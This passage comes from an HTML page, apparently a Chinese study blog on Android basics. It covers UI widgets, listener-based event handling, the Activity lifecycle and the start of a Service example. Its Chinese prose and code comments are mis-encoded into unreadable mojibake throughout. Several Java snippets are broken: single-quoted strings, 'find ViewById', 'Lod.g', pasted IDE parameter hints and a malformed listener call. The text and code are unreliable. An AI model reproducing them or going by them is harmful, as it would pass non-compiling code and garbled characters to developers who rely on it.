æ–‡ä»¶å¤¹</h4><p>æ¥å­˜æ”¾å€¼èµ„æºæ–‡ä»¶ï¼Œå€¼èµ„æºæ–‡ä»¶ç”¨æ¥å­˜æ”¾åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨çš„å¸¸é‡å€¼å’Œé¢œè‰²ä¿¡æ¯ã€‚</p><p>å½“æƒ³è¦æ‰‹æœºå†…å®¹å’Œç³»ç»Ÿè¯­è¨€ä¸€è‡´ä½¿ï¼Œåˆ›å»ºä¸€ä¸ªvaluse-zh/values-en</p><h4 id="classes-dexæ–‡ä»¶">classes.dexæ–‡ä»¶</h4><p>å®ƒæ˜¯åº”ç”¨ç¨‹åºçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚å®ƒæ˜¯ä¸€ä¸ªè¢«ç¼–è¯‘è¿‡çš„DEXï¼ˆDalvik Executableï¼‰æ–‡ä»¶ï¼Œæ˜¯Dalvikè™šæ‹Ÿæœºçš„æ ¼å¼ï¼Œç”¨äºåœ¨Androidè®¾å¤‡ä¸Šè¿è¡ŒJavaåº”ç”¨ç¨‹åºã€‚</p><h2 id="å¸¸ç”¨çš„UIç»„ä»¶">å¸¸ç”¨çš„UIç»„ä»¶</h2><p>TextViewâ€“æ–‡æœ¬æ˜¾ç¤ºç»„ä»¶</p><p>EditViewâ€“æ–‡æœ¬ç¼–è¾‘ç»„ä»¶ï¼Œç»§æ‰¿è‡ªTextViewç»„ä»¶</p><p>Buttonâ€“æŒ‰é’®</p><p>CheckBox &amp;&amp; RadioButtonâ€“å¤é€‰æ¡†å’Œå•é€‰æ¡†ï¼Œç»§æ‰¿è‡ªButtonç±»ã€‚å…¶ä¸­RadioButtonæ˜¯å•é€‰æŒ‰é’®å¿…é¡»ç¼–åˆ¶åˆ°RadioGroupä¸­ï¼ŒåŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªå¯ä»¥è¢«é€‰ä¸­ã€‚</p><p>ListViewâ€“åˆ—è¡¨ç»„ä»¶</p><p>Spinnerâ€“ä¸‹æ‹‰åˆ—è¡¨ç»„ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button_test);</span><br><span class="line">button.setText(<span class="string">&#x27;Button&#x27;</span>); <span class="comment">//è®¾ç½®buttonç»„ä»¶çš„å†…å®¹ä¸ºâ€˜buttonâ€™</span></span><br><span class="line"></span><br><span class="line"><span class="type">TextView</span> <span class="variable">textview</span> <span class="operator">=</span> findViewById(R.id.textView_test);</span><br><span class="line">textview.setText(<span class="string">&#x27;text&#x27;</span>); <span class="comment">//è®¾ç½®æ–‡æœ¬æ¡†å†…å®¹ä¸º&#x27;text&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="type">EditText</span> <span class="variable">edittext</span> <span class="operator">=</span>  findViewById(R.id.editTextTextPassword);</span><br><span class="line">edittext.setHint(<span class="string">&#x27;è¯·è¾“å…¥å¯†ç &#x27;</span>) <span class="comment">//è®¾ç½®ç”¨æˆ·ç¼–è¾‘æ¡†ä¸­æç¤ºâ€˜è¯·è¾“å…¥å¯†ç â€™ï¼Œå½“ç”¨æˆ·è¾“å…¥æ—¶å°±æ¶ˆå¤±</span></span><br><span class="line"> </span><br><span class="line"><span class="type">RadioGroup</span> <span class="variable">radiogroup</span> <span class="operator">=</span> findViewById(R.id.radioGroup);</span><br><span class="line">radiogroup.check(R.id.radioButton); <span class="comment">//  RadioGroupä¸­é€‰æ‹©ä¸€ä¸ªå•é€‰æ¡†</span></span><br><span class="line"></span><br><span class="line"><span class="type">AdapterView</span> <span class="variable">spinner</span> <span class="operator">=</span> find <span class="title function_">ViewById</span><span class="params">(R.id.spinner)</span>; <span class="comment">//åˆ—è¡¨ç±»æ§ä»¶,ä½¿ç”¨AdapterViewç±»ï¼Œè¿™æ ·å¯ä»¥æ–¹ä¾¿åˆ‡æ¢Spinnerå’ŒListViewï¼Œåªéœ€è¦æ”¹R.layout_itemæ ‡ç­¾å¤´å°±å¯ä»¥</span></span><br><span class="line"><span class="comment">//æ•°ç»„æ•°æ®é€‚é…å™¨</span></span><br><span class="line"><span class="comment">//åˆ›å»ºæ•°æ®é€‚é…å™¨å¯¹è±¡</span></span><br><span class="line">String []data = &#123;<span class="string">&#x27;Item1&#x27;</span>,<span class="string">&#x27;Item2&#x27;</span>,<span class="string">&#x27;Item3&#x27;</span>&#125;; <span class="comment">//ä¸‹æ‹‰åˆ—è¡¨çš„æ•°æ®ï¼Œä¸ºStringå‹ æ‰€ä»¥ä¸‹é¢æ˜¯&lt;String&gt;</span></span><br><span class="line">ArrayAdapter&lt;String&gt; adapter = <span class="keyword">new</span> <span class="title class_">ArrayAdapter</span>&lt;String&gt;(context <span class="built_in">this</span>, </span><br><span class="line">                                                        R.layout_item(å¸ƒå±€æ–‡ä»¶ï¼Œæ§åˆ¶ä¸‹æ‹‰åˆ—è¡¨æ¯ä¸€è¡Œçš„æ ·å­),</span><br><span class="line">                                                        R.id.textview_msg(æ–‡æœ¬æ¡†id),</span><br><span class="line">                                                        data);</span><br><span class="line">spinner.setAdapter(adapter); <span class="comment">//ä¸‹æ‹‰åˆ—è¡¨åŠ è½½å¯¹è±¡ </span></span><br><span class="line"><span class="comment">//ä½¿ç”¨ç®€å•é€‚é…å™¨å¯ä»¥ä½¿æ¯ä¸ªä¸‹æ‹‰åˆ—è¡¨å›¾ç‰‡å’Œæ•°æ®ä¸ä¸€æ ·</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å®‰å“äº‹ä»¶å¤„ç†æ¨¡å‹">å®‰å“äº‹ä»¶å¤„ç†æ¨¡å‹</h2><h3 id="åŸºäºå¤šæ€æœºåˆ¶çš„äº‹ä»¶å¤„ç†">åŸºäºå¤šæ€æœºåˆ¶çš„äº‹ä»¶å¤„ç†</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å½“å±å¹•è¢«è§¦æ‘¸æ—¶è¯¥æ–¹æ³•è¢«è°ƒç”¨ eventä¸ºè§¦æ‘¸äº‹ä»¶</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onTouchEvent</span><span class="params">(MotionEvent event)</span>;</span><br><span class="line"><span class="comment">//å½“é”®ç›˜è¢«æŒ‰ä¸‹æ—¶è¯¥æ–¹æ³•è¢«è°ƒç”¨ keycodeä¸ºæŒ‰é”®ç  eventä¸ºæŒ‰é”®äº‹ä»¶</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onKeyUp</span><span class="params">(<span class="type">int</span> keyCode,KeyEvent event)</span>;</span><br><span class="line"><span class="comment">//å½“é”®ç›˜è¢«å¼¹èµ·æ—¶è¯¥æ–¹æ³•è¢«è°ƒç”¨ keycodeä¸ºæŒ‰é”®ç  eventä¸ºæŒ‰é”®äº‹ä»¶</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onKeyDown</span><span class="params">(<span class="type">int</span> keyCode,KeyEvent event)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿”å›å€¼ä¸ºtrueæ—¶ï¼Œè¡¨ç¤ºå·²ç»å®Œæ•´çš„å¤„ç†äº†äº‹ä»¶ï¼Œå…¶ä»–å›è°ƒæ–¹æ³•ä¸ä¼šåœ¨å¤„ç†è¯¥äº‹ä»¶</span></span><br><span class="line"><span class="comment">//è¿”å›å€¼ä¸ºfalseæ—¶ï¼Œè¡¨ç¤ºè¢«æ²¡æœ‰å®Œå…¨å¤„ç†å®Œäº‹ä»¶ï¼Œå…¶ä»–å›è°ƒæ–¹æ³•ä¼šç»§ç»­å¯¹è¯¥äº‹ä»¶è¿›è¡Œå¤„ç†</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event.getPointerCount();  <span class="comment">//è·å–åæ ‡æ•°é‡ </span></span><br></pre></td></tr></table></figure><h3 id="åŸºäºç›‘å¬æ¥å£çš„äº‹ä»¶å¤„ç†">åŸºäºç›‘å¬æ¥å£çš„äº‹ä»¶å¤„ç†</h3><p>å¤„ç†å¤šæ€çš„ä¸å¯ç»´æŠ¤æ€§</p><ul><li><p>äº‹ä»¶æ¥å£</p></li><li><p>View.OnClickListener ===&gt; å•å‡»äº‹ä»¶æ¥å£</p></li></ul><p>â€‹        å½“ç”¨æˆ·è§¦æ‘¸è¿™ä¸ªitemï¼ˆåœ¨è§¦æ‘¸æ¨¡å¼ä¸‹ï¼‰ï¼Œæˆ–è€…é€šè¿‡æµè§ˆé”®æˆ–è·Ÿè¸ªçƒèšç„¦åœ¨è¿™ä¸ªitemä¸Šï¼Œç„¶åæŒ‰ä¸‹â€œç¡®è®¤â€é”®æˆ–è€…æŒ‰ä¸‹è·Ÿè¸ªçƒæ—¶è¢«è°ƒç”¨ã€‚</p><ul><li><p>View.OnCreateContextMenuListener ===&gt; èœå•äº‹ä»¶æ¥å£                                                                                   å½“æ­£åœ¨åˆ›å»ºä¸€ä¸ªä¸Šä¸‹æ–‡èœå•çš„æ—¶å€™è¢«è°ƒç”¨ï¼ˆä½œä¸ºæŒç»­çš„â€œé•¿ç‚¹å‡»â€åŠ¨ä½œçš„ç»“æœï¼‰ã€‚</p></li><li><p>View.OnFocusChangeListener ===&gt; ç„¦ç‚¹æ”¹å˜äº‹ä»¶<br>å½“ç”¨æˆ·ä½¿ç”¨æµè§ˆé”®æˆ–è·Ÿè¸ªçƒæµè§ˆè¿›å…¥æˆ–ç¦»å¼€è¿™ä¸ªitemæ—¶è¢«è°ƒç”¨</p></li><li><p>View.OnKeyListener ===&gt; æŒ‰é”®äº‹ä»¶æ¥å£<br>å½“ç”¨æˆ·èšç„¦åœ¨è¿™ä¸ªitemä¸Šå¹¶æŒ‰ä¸‹æˆ–é‡Šæ”¾è®¾å¤‡ä¸Šçš„ä¸€ä¸ªæŒ‰é”®æ—¶è¢«è°ƒç”¨ã€‚</p></li><li><p>View.OnLongClickListener ===&gt; é•¿æŒ‰äº‹ä»¶æ¥å£<br>å½“ç”¨æˆ·è§¦æ‘¸å¹¶æ§åˆ¶ä½è¿™ä¸ªitemï¼ˆåœ¨è§¦æ‘¸æ¨¡å¼ä¸‹ï¼‰ï¼Œæˆ–è€…é€šè¿‡æµè§ˆé”®æˆ–è·Ÿè¸ªçƒèšç„¦åœ¨è¿™ä¸ªitemä¸Šï¼Œç„¶åä¿æŒæŒ‰ä¸‹â€œç¡®è®¤â€é”®æˆ–è€…æŒ‰ä¸‹è·Ÿè¸ªçƒï¼ˆä¸€ç§’é’Ÿï¼‰æ—¶è¢«è°ƒç”¨ã€‚</p></li><li><p>View.OnTouchListener ===&gt; è§¦å±äº‹ä»¶æ¥å£<br>å½“ç”¨æˆ·æ‰§è¡Œçš„åŠ¨ä½œè¢«å½“åšä¸€ä¸ªè§¦æ‘¸äº‹ä»¶æ—¶è¢«è°ƒç”¨ï¼ŒåŒ…æ‹¬æŒ‰ä¸‹ï¼Œé‡Šæ”¾ï¼Œæˆ–è€…å±å¹•ä¸Šä»»ä½•çš„ç§»åŠ¨æ‰‹åŠ¿ï¼ˆåœ¨è¿™ä¸ªitemçš„è¾¹ç•Œå†…ï¼‰ã€‚</p></li><li><p>ä¸¾ä¸ªä¾‹å­ï¼Œå†™ä¸€ä¸ªç®€å•çš„å•å‡»äº‹ä»¶ç›‘å¬å™¨</p></li><li><p>é‡å†™ç›‘å¬å™¨</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClickListen</span> <span class="keyword">implements</span> <span class="title class_">View</span>.OnClickListener&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View V)</span>&#123;</span><br><span class="line">        Log.d(tag:<span class="string">&quot;51asm&quot;</span>,msg:<span class="string">&quot;button1 click&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>æ³¨å†Œç›‘å¬å™¨</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button);</span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">MyClickListen</span>());</span><br></pre></td></tr></table></figure><p>å½“ç‚¹å‡»ç»‘å®šçš„æŒ‰é’®å°±ä¼šè°ƒç”¨MyClickListenæ–¹æ³•</p><ul><li>åŒ¿åç±»å®ç°ç›‘å¬å™¨</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TextView mTextView;</span><br><span class="line">mTextView = findViewById(R.id.textview);</span><br><span class="line">  </span><br><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span>findViewById(R.id.button);  </span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View V)</span>&#123;</span><br><span class="line">        Lod.g(tag:<span class="string">&quot;51asm&quot;</span>,msg:<span class="string">&quot;MainActivity$1 button click&quot;</span>);</span><br><span class="line">        mTextView.setText(<span class="string">&quot;&quot;</span>MainActivity$<span class="number">1</span> button<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">   </span></span><br></pre></td></tr></table></figure><h3 id="åŸºäºç³»ç»Ÿè®¾ç½®çš„äº‹ä»¶å¤„ç†">åŸºäºç³»ç»Ÿè®¾ç½®çš„äº‹ä»¶å¤„ç†</h3><p>Configurationç±»</p><p>Configurationç±»ä¸“é—¨ç”¨äºæ‰«ææ‰‹æœºè®¾å¤‡ä¸Šçš„é…ç½®ä¿¡æ¯</p><p>è·å–ç³»ç»Ÿè®¾ç½®ä¿¡æ¯</p><p>Resourcesç±»çš„getConfigurationæ–¹æ³•ï¼Œå¯ä»¥è·å–ç³»ç»Ÿè®¾ç½®å¯¹è±¡</p><p>Resourceså¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡Activityçš„getResourcesæ–¹æ³•è·å–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span>&#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    <span class="type">Configuration</span> <span class="variable">config</span> <span class="operator">=</span> getResources().getConfiguration();</span><br><span class="line">    <span class="keyword">if</span>(config.orientation == Configuration.ORIENTATION_LANDSCAPE)&#123;</span><br><span class="line">        Toast.makeText(context:<span class="built_in">this</span>,text:<span class="string">&quot;æ¨ªå±&quot;</span>ï¼ŒToast.LENGTH_LONG).show(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        Toast.makeText(context:<span class="built_in">this</span>,text:<span class="string">&quot;çºµå±&quot;</span>ï¼ŒToast.LENGTH_LONG).show(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Androidå¯åŠ¨æµç¨‹image-20231024163626871">Androidå¯åŠ¨æµç¨‹<img src="/posts/7e4211d.htm/image-20231024163626871.png" alt="image-20231024163626871"></h2><h2 id="Androidå››å¤§ç»„ä»¶">Androidå››å¤§ç»„ä»¶</h2><h3 id="Activity">Activity</h3><ul><li>Activityæ˜¯ä¸€ä¸ªUIå®¹å™¨ï¼Œå¯ä»¥åŒ…å«ä»»æ„çš„ç”¨æˆ·æ¥å£å…ƒç´ ï¼Œå¦‚æŒ‰é’®ï¼Œæ–‡æœ¬æ¡†ç­‰ã€‚</li><li>Activityæä¾›äº†å’Œç”¨æˆ·äº¤äº’çš„å¯è§†åŒ–ç•Œé¢</li><li>Activityä¹‹é—´å¯ä»¥é€šè¿‡æ¶ˆæ¯çš„æ–¹å¼äº’ç›¸è·³è½¬å’Œä¼ è¾“æ•°æ®</li><li>è¦ä½¿åº”ç”¨èƒ½å¤Ÿä½¿ç”¨Activityï¼Œå¿…é¡»åœ¨é…ç½®æ¸…å•ä¸­å£°æ˜ActivityåŠå…¶ç‰¹å®šå±æ€§</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¯åŠ¨ä¸€ä¸ªæ–°ç•Œé¢</span></span><br><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button_new);</span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener)&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        <span class="comment">//å¯åŠ¨æ–°çš„Activity</span></span><br><span class="line">         <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(MainActivity.<span class="built_in">this</span>, NewActivity.class);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Actionå’Œcategoryçš„å€¼å¯ä»¥è‡ªå®šä¹‰ï¼ŒAndroidç³»ç»Ÿä¹Ÿæä¾›äº†è®¸å¤šé¢„å®šä¹‰çš„å¸¸é‡å€¼ï¼Œç”¨äºå¯åŠ¨ç³»ç»Ÿé¢„å®šä¹‰çš„Activityã€Serviceã€‚<img src="/posts/7e4211d.htm/image-20231021214934063.png" alt="image-20231021214934063"></p><p>Intentç±»ä¸­ä¸Categoryç›¸å…³çš„å¸¸é‡å€¼åˆ—è¡¨<img src="/posts/7e4211d.htm/image-20231021214955497.png" alt="image-20231021214955497"></p><p>Intentç±»ä¸­ä¸Actionç›¸å…³çš„å¸¸é‡åˆ—è¡¨æ¸…å•æ–‡ä»¶ä¸­ï¼Œintent-filterä¹‹é—´çš„ä¸ºä¸»ç•Œé¢ï¼Œ.LAUNCHERä¸ºå›¾æ ‡</p><p><img src="/posts/7e4211d.htm/image-20231021214219019.png" alt="image-20231021214219019"></p><h4 id="Activityç”Ÿå‘½å‘¨æœŸ">Activityç”Ÿå‘½å‘¨æœŸ</h4><p>ä¸€ä¸ªActivityåœ¨å…¶ç”Ÿå‘½å‘¨æœŸä¸­ä¼šç»å†å¤šç§çŠ¶æ€ï¼Œå¯ä»¥ä½¿ç”¨ä¸€ç³»åˆ—å›è°ƒæ¥å¤„ç†çŠ¶æ€ä¹‹é—´çš„è½¬æ¢<img src="/posts/7e4211d.htm/image-20231022162550221.png" alt="image-20231022162550221"></p><p>onCreate()ï¼šè¡¨ç¤ºActivityæ­£åœ¨è¢«åˆ›å»ºï¼Œåšä¸€äº›activityåˆå§‹åŒ–å·¥ä½œ</p><p>onStart()ï¼šActivityç”±ä¸å¯è§å˜ä¸ºå¯è§çš„æ—¶å€™è°ƒç”¨ã€‚æ­¤æ—¶activityæ˜¯ç”¨æˆ·å¯è§çŠ¶æ€ï¼Œä½†æœªå‡ºç°åœ¨å‰å°ã€‚æ²¡æœ‰ç„¦ç‚¹ï¼Œä¸èƒ½ä¸ç”¨æˆ·äº¤äº’ã€‚</p><p>onResume()ï¼šActivityå‡†å¤‡å¥½å’Œç”¨æˆ·è¿›è¡Œäº¤äº’çš„æ—¶å€™è°ƒç”¨ã€‚æ­¤æ—¶Activityä¸€å®šä½äºä»»åŠ¡æ ˆçš„æ ˆé¡¶ï¼Œå¹¶ä¸”å¤„äºè¿è¡ŒçŠ¶æ€ï¼Œå¯ä¸ç”¨æˆ·è¿›è¡Œäº¤äº’ã€‚</p><p>onPause()ï¼šç³»ç»Ÿå‡†å¤‡å»å¯åŠ¨æˆ–æ¢å¤å¦ä¸€ä¸ªActivityçš„æ—¶å€™è°ƒç”¨ã€‚å½“å¦å¤–ä¸€ä¸ªactivityè¦†ç›–å½“å‰acitivtyæ—¶ï¼Œå½“å‰activityä¼šè¿›å…¥åˆ°onPause()æ–¹æ³•ä¸­ï¼Œå½“å‰activityæ˜¯å¯è§çš„ï¼Œä½†ä¸èƒ½ä¸ç”¨æˆ·äº¤äº’çŠ¶æ€ã€‚</p><p>onStop()ï¼šActivityå®Œå…¨ä¸å¯è§çš„æ—¶å€™è°ƒç”¨ã€‚æ­¤æ—¶activityå¯¹ç”¨æˆ·æ˜¯ä¸å¯è§çš„ã€‚</p><p>onDestroy()ï¼šactivityè¢«é”€æ¯ä¹‹å‰è¿›è¡Œè°ƒç”¨ ï¼Œactivityç”Ÿå‘½å‘¨æœŸæœ€åä¸€ä¸ªå›è°ƒï¼Œè¿™é‡Œå¯ä»¥åšä¸€äº›å›æ”¶å·¥ä½œï¼Œèµ„æºé‡Šæ”¾ã€‚</p><p>onRestart()ï¼šActivityç”±åœæ­¢çŠ¶æ€å˜ä¸ºè¿è¡ŒçŠ¶æ€çš„æ—¶å€™è°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯activityè¢«é‡æ–°å¯åŠ¨äº†ã€‚</p><h4 id="æ‰‹æœºä¸­æŒ‰é€€å‡ºæ—¶è¿›è¡Œç¡®å®šå¼¹çª—ï¼šæ˜¯å¦ç¡®å®šé€€å‡º">æ‰‹æœºä¸­æŒ‰é€€å‡ºæ—¶è¿›è¡Œç¡®å®šå¼¹çª—ï¼šæ˜¯å¦ç¡®å®šé€€å‡º</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onKeyDown</span><span class="params">(<span class="type">int</span> keyCode,KeyEvent event)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (keyCode == KeyEvent.KEYCODE_BACK)&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">AlertDialog</span>.Builder(<span class="built_in">this</span>)</span><br><span class="line">            .setTitle(<span class="string">&quot;51asm&quot;</span>)</span><br><span class="line">            .setIcon(R.mipmap.ic_launcher)</span><br><span class="line">            .setMessage(<span class="string">&quot;ä½ æ˜¯å¦çœŸçš„è¦é€€å‡ºç¨‹åºï¼Ÿ&quot;</span>)</span><br><span class="line">            .setPositiveButton(<span class="string">&quot;ç¡®å®š&quot;</span>ï¼Œ<span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListenter()&#123;</span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialog,<span class="type">int</span> which)</span>&#123;</span><br><span class="line">                    finish(); <span class="comment">//é”€æ¯activity</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">            .setNegativeButton(<span class="string">&quot;å–æ¶ˆ&quot;</span>ï¼Œ<span class="literal">null</span>)</span><br><span class="line">            .create()</span><br><span class="line">            .show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.onKeyDown(keyCode,event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åŠ¨æ€ç”ŸæˆFragmentimage-20231022165305482">åŠ¨æ€ç”ŸæˆFragment<img src="/posts/7e4211d.htm/image-20231022165305482.png" alt="image-20231022165305482"></h4><h3 id="Service">Service</h3><h4 id="æ¦‚å¿µ">æ¦‚å¿µ</h4><ul><li>ä¸€ç§å¯åœ¨åå°æ‰§è¡Œé•¿æ—¶é—´è¿è¡Œæ“ä½œè€Œä¸æä¾›ç•Œé¢çš„åº”ç”¨ç»„ä»¶</li><li>ä½¿ç”¨æœåŠ¡æ—¶ï¼Œéœ€è¦åœ¨é…ç½®æ–‡ä»¶ä¸­å£°æ˜ï¼Œ<service android:name=".ç±»å "></service></li></ul><h4 id="ç®€å•æ¶ˆæ¯å¤„ç†">ç®€å•æ¶ˆæ¯å¤„ç†</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button_start&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;start&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_heigth</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button_stop&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;stop&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_heigth</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button_bind&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;bind&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_heigth</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button_unbind&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;unbind&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_heigth</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span></span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>æ³¨å†Œå®ŒæŒ‰é’®å</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button_start);</span><br><span class="line">button.setOnClickListener(<span 